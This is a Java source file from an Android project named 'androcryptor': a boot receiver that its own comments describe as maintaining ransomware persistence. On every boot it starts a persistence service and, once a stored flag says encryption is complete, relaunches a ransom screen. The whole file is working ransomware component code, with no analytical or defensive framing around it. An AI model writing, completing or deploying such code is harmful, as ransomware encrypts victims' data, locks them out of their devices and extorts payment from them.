package com.example.androcryptor;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Build;

/**
 * Handles device boot events to maintain persistence and ransomware state
 */
public class BootReceiver extends BroadcastReceiver {
    @Override
    public void onReceive(Context context, Intent intent) {
        //#region Boot Detection
        // Detects various boot completion events across different Android versions
        if (Intent.ACTION_BOOT_COMPLETED.equals(intent.getAction()) ||
            Intent.ACTION_LOCKED_BOOT_COMPLETED.equals(intent.getAction()) ||
            "android.intent.action.QUICKBOOT_POWERON".equals(intent.getAction()) ||
            "android.intent.action.REBOOT".equals(intent.getAction())) {
        //#endregion

            //#region Persistence Service Initialization
            // Initializes the persistence service based on Android API version
            Intent persistenceIntent = new Intent(context, PersistenceService.class);
            if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                context.startForegroundService(persistenceIntent);
            } else {
                context.startService(persistenceIntent);
            }
            //#endregion

            //#region Ransom Activity State Management
            // Verifies encryption status and launches ransom activity if appropriate
            try {
                boolean encryptionComplete = context.getSharedPreferences("ac_prefs", Context.MODE_PRIVATE)
                        .getBoolean("encryption_complete", false);
                if (encryptionComplete) {
                    Intent ransomIntent = new Intent(context, RansomActivity.class);
                    ransomIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
                    context.startActivity(ransomIntent);
                }
            } catch (Exception ignored) {}
            //#endregion
        }
    }
}
